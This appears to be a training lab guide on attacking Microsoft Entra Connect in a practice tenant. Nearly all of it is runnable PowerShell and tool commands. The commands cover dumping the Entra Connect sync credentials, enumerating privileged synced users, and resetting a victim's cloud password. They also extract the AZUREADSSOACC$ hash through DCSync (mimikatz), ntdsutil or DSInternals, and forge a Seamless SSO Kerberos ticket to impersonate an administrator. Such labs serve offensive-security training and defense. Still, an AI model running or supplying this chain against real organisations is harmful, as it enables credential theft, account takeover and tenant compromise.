# Lab 2 - Entra Connect Attacks
### Prepare a victim user with high privileges
in Entra portal (login with your admin tenant creds), select ***user1*** and assign it with the **Active** (not *Eligible*) **Application Administrator** role



# Attacks
From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Entra Connect server (in our case- it's the DC VM)

## 1. Extract Entra Connect Credentials and target a victim user

#### 1. Recon - Seamless SSO status + tenant id:
```powershell
Invoke-AADIntReconAsOutsider -DomainName YOURDOMAIN.onmicrosoft.com
```

#### 2. Dumping and Extracting Entra (Azure AD) Connect credentials:
1. run powershell as admin on the server where Entra Connect is installed
2. execute:
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
```

#### 2. Finding a target (victim) user to attack

Login using dumped Sync_XX account:
```powershell
# Prompt for credentials and retrieve & store access token to cache
# Enter your dumped Sync_XX account creds!
$tenantId = "YOUR_TENANT_ID"
$at = Get-AADIntAccessTokenForAADGraph -SaveToCache

# method 1: 
$userUPN = "Sync_xxx@YOURDOMAIN.onmicrosoft.com" # change the username
Connect-AzureAD -AccountId  $userUPN  -TenantId $tenantId -AadAccessToken $at

# method 2:
Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id,
```

Enumerate users:
```powershell
# list on-premise, synced users with their roles
$onpremSyncedUsers = Get-AzureADUser -All $true | Where-Object { 
    $_.OnPremisesSecurityIdentifier -ne $null 
} 
$onpremSyncedUsers | ForEach-Object { 
    $user = $_; 
    Get-AzureADDirectoryRole | ForEach-Object { 
        $role = $_;
        Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='ImmutableId';Expression={$user.ImmutableId}}, @{Name='Role';Expression={$role.DisplayName}} 
    } 
} | Format-Table -Wrap -AutoSize
```

## 2. Reset Password Attack
#### Reset the victim user's Entra password:
```powershell
Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
```

Now, open https://entra.microsoft.com in the browser **in incognito** and login as that user *VICTIM_USER@YOURDOMAIN.onmicrosoft.com* with the new password :)


#
## 3. Silver Ticket (Seamless SSO) Attack

Set the domain:
```powershell
$domain = "MYDOMAIN" # change to your domain name WITHOUT the ".onmicrosoft.com" part 
```

#### 1. Get AZUREADSSOACC computer account's hash:
```powershell
# Option 1: Get-ADReplAccount
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain $domain -Server dcvm # take the "NTHash" part

# Option 2: mimikatz
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$"
    
# Option 3: Dump NTDS.dit and registry:
ntdsutil "ac i ntds" "ifm” "create full C:\temp" q q # Now the AD and registry are dumped to C:\temp and we can extract the password hash using DSInternals.
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hex # Get the password's hash of AZUREADSSOACC
# remote the empty spaces and keep the hash
```

Set the hash:
```powershell
$hash = "CHANGEME"
```
#### 2. Find victim user to impersonate
1. option 1:
    ```powershell
    # Option 1: query Entra + get roles
    Import-Module AzureAD
    Connect-AzureAD # use the dumped Entra Connect creds (Sync_XXX account)


    # Option 2: query AD (w/o getting Entra roles)
    Get-ADReplAccount -SamAccountName 'VICTIM_USER' -Domain $domain -Server dcvm # take the "Sid:" part
    ```

Set the victim user's SID:
```powershell
$victimUserSid = "S-1-5-21-CHANGEME" # set the sid of the user you wish to impersonate
```

#### 4. Perform the attack
```powershell
# generate kerberos ticket
$kerberos=New-AADIntKerberosTicket -SidString $victimUserSid -Hash $hash

# get an access token for that user
$at = Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $domain".onmicrosoft.com"
# if you get AADSTS50079 error, it might mean you have a conditional access policy in your Entra tenant named "Security info registration for Microsoft partners and vendors" that blocks this login, you need to reinstall the entire lab from scratch and associate it yo your new tenant

# start exploring using MS Graph API!
$MaximumFunctionCount = 8192 # bypass powershell's scope memory limit
Import-Module Microsoft.Graph.Users
$securedAT = ConvertTo-SecureString $at -AsPlainText -Force
Connect-MgGraph -AccessToken $securedAT

Get-MgUser
#Readme: https://aka.ms/graph/sdk/powershell
#SDK Docs: https://aka.ms/graph/sdk/powershell/docs
#API Docs: https://aka.ms/graph/docs
```
What can you do now that you are an Application Administrator?